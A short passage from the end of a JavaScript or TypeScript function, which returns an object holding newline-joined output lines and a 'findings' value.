  }

  return { output: output.join("\n"), findings }
}
